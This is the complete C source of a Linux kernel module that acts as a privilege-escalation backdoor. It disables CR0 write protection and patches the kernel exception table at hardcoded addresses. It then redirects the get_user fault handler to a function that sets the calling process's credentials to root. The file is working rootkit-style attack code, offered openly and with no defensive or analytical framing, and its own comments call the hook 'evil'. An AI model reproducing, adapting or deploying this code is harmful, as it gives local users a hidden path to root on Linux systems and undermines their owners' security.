#define AUTHOR "DOHMATOB E. Dopgima & Jerôme CROS."
#define LIC "GPL"

#ifndef __KERNEL__
#define __KERNEL__
#endif

#ifndef MODULE
#define MODULE
#endif

#ifdef MODVERSIONS
#include <linux/modversions>
#endif

#define __DEBUG__
#define __cr0__

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/init.h>
#include <linux/version.h>
#include <linux/mm.h>
#include <linux/proc_fs.h> 


#define __cr0_WP_bit	16

#define __unset_jth_bit(n, j) (n & ~(0x1 << j))
#define __set_jth_bit(n, j) (n | (0x1 << j))

#define __START___EX_TABLE 0xc05d02d0
#define __END___EX_TABLE   0xc05d15f8
#define __BAD_GET_USER     0xc0358f0b

unsigned long __start_ex_table;
unsigned long __end_ex_table;

/* our data structure for exception handler entries */
typedef struct ex_entry_struct
{
  struct ex_entry_struct     *next;
  unsigned long           address;
  unsigned long           insn;
  unsigned long           fixup;
} *ex_entry_t;

/* storage for 'fixup' exception handler table we'll hack */
ex_entry_t __ex_old_table;


/* base address of syscall table*/
unsigned long *__sct;


/*----------------------------------------------------*\
  |unchecks hardware cr0 write-protection (WP) on cpu|
\*----------------------------------------------------*/
#define __handle_cr0_WP()  write_cr0 (__unset_jth_bit (read_cr0 (), __cr0_WP_bit))


/*--------------------*\
  |restores cr0 stuff|
\*--------------------*/
#define __unhandle_cr0_WP() write_cr0 (__set_jth_bit (read_cr0 (), __cr0_WP_bit))


/*---------------------------------------*\
  |changes current task's credentials to|
  |root and then makes it evil everafter|
\*---------------------------------------*/
void __nirvana (void)
{
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29) 
  /*here, creds were exported &  directly 
    rewritable in struct task_struct .. */ 
  current->uid = current->gid = 0;					
  current->euid = current->egid = 0;					
  current->suid = current->sgid = 0;				
  current->fsuid = current->fsgid = 0;				
  
#else							
  /* here, creds are no longer exported in struct
     task_struct; we can't overrite cred fields .. */
  struct cred* new = prepare_creds (); /* clone current task's creds */	
  if(new)								
    {									
      /* root stuff */							
      new->uid = new->gid = 0;						
      new->euid = new->egid = 0;					 
      new->suid = new->sgid = 0;					 
      new->fsuid = new->fsgid = 0;					
      commit_creds(new); /* commit changes */				
    }									
  
#endif
}				


/*----------------------------------------------------*\
  |evil hook for 'fixup' page fault exception handler|
\*----------------------------------------------------*/
static int __hook_page_fault_exception_handler (void)
{
  unsigned long __start_ex_table = __START___EX_TABLE;
  unsigned long __end_ex_table = __END___EX_TABLE;

  unsigned long       insn = __start_ex_table;
  unsigned long       fixup; /* legimate handler we'll be redirectly */
  ex_entry_t          entry, last_entry;

  __ex_old_table = NULL;


  /* find exception handler */
  for (  ; insn < __end_ex_table; insn += 2 * sizeof (unsigned long)) 
    {
      fixup = insn + sizeof (unsigned long);
      
      if (*(unsigned long *)fixup == __BAD_GET_USER)
	{
	  /* exception handler localized */
	  
	  entry = (ex_entry_t)kmalloc (GFP_ATOMIC, sizeof (struct ex_entry_struct));
	  
	  if (!entry)
	    /* screwed */
	    return -1;
	  /* intialize entry */
	  entry->next = NULL;
	  entry->address = insn;
	  entry->insn = *(unsigned long *)insn;
	  entry->fixup = *(unsigned long *)fixup;
	  
	  if (__ex_old_table) 
	    {
	      last_entry = __ex_old_table;
	      
	      /* take entry to borders */
	      while (last_entry->next != NULL)
		last_entry = last_entry->next;
	      
	      last_entry->next = entry;
	    } else
	    __ex_old_table = entry;
	  
	  /* start hook-up */
#ifdef __cr0__
	  __handle_cr0_WP ();
#endif
#ifdef __DEBUG__
	  printk (KERN_INFO "replacing legitmate fixup-code for get_user () with an evil handler of ours ..\n");
#endif
	  *(unsigned long *)fixup = (unsigned long)__nirvana;
#ifdef __cr0__
	  __unhandle_cr0_WP ();
#endif
	  /* end hook-up */
      }
    }
  return 0;
}


/*------------------------*\
  |unhooks the hook above|
\*------------------------*/
static void __unhook_page_fault_exception_handler (void)
{
  ex_entry_t     entry = __ex_old_table;
  ex_entry_t     tmp;
  
  if (!entry)
    return;
  
  /* restore legitimate handler; remember in module_init, we mouved
     the corresponding entry to the borders of the exception handler table */
  while (entry)
    {
#ifdef __cr0__
      __handle_cr0_WP ();
#endif
#ifdef __DEBUG__
      printk (KERN_INFO "restoring legimate fixcode (bad_get_user) ..\n");
#endif
      *(unsigned long *)entry->address = entry->insn;
      *(unsigned long *)((entry->address) + sizeof (unsigned long)) = entry->fixup;
#ifdef __cr0__
      __unhandle_cr0_WP ();
#endif
      tmp = entry->next;
      kfree (entry);
      entry = tmp;
    }
}


/*----------------------------------------*\
  | injects this module into KERNELSPACE |

\*----------------------------------------*/
static int __init install (void)
{
#ifndef __cr0__
  __handle_cr0_WP ();
#endif

#ifdef __DEBUG__
  printk (KERN_INFO "\nself-installing in KERNELSPACE ..\n");
#endif
  
__hook_page_fault_exception_handler ();

  return 0;
}


/*---------------------------------------*\	
  | ejects this module from KERNELSPACE |
\*---------------------------------------*/
static void __exit uninstall (void)
{
#ifdef __DEBUG__
  printk(KERN_INFO "\nself-uninstalling from KERNELSPACE\n ..");
#endif

  __unhook_page_fault_exception_handler ();

#ifdef __DEBUG__
  printk (KERN_INFO "\nDONE!\n");
#endif

#ifndef __cr0__
  __unhandle_cr0_WP ();
#endif
}

module_init (install);
module_exit (uninstall);
MODULE_LICENSE (AUTHOR);
MODULE_LICENSE (LIC);


